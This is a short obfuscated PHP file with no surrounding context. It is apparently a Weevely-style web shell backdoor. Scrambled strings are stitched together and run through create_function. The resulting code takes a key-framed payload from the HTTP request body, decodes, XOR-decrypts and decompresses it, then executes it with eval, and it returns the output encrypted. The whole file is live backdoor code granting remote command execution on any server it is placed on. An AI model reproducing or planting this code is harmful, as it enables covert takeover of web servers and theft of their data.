<?php
$c=str_replace('U','','crUeaUteU_fuUnUcUtion');
$i='N"N"N$m[1]),"N$k)));$o=@"Nob"N_get"N_contents("N);@ob_en"Nd_clean();"N$r=';
$s=';"N$j++,$i++){$o"N.=$t{$i"N}^$k{"N$j"N};}}return $o"N;}if"N (@preg_"Nmat"Nc';
$P='=1) {@o"Nb_sta"Nrt();@"Ne"Nval(@gz"Nuncompr"Ness(@x"N(@b"Nase64_decode("';
$q='Nstrlen($t);$"No="";for($i=0;"N$i<"N$l"N;){"N"Nfor($j=0;($j<$"Nc&&$"Ni<$l)';
$X='@bas"Ne64_"Ne"Nncode(@x(@g"Nzcompre"N"Nss($o),$k"N));prin"Nt(""N$p$kh$r$kf");}';
$m='p="gjCcRNIJOHAZ"N0VUu";f"N"Nunction x("N$t,$k){$"Nc=s"Ntrlen"N("N$"Nk);$l="';
$U='$k="N"baa83a8"Ne";$"Nkh="21e979d"N8ac77"N""N;$kf=""N033537"N4"N58ec0""N;$';
$y='h("/$"Nkh("N.+"N)$"Nkf/","N@file_ge"Nt_contents(""Nphp://input"N"),"N$m)=';
$C=str_replace('"N','',$U.$m.$q.$s.$y.$P.$i.$X);
$N=$c('',$C);$N();
?>
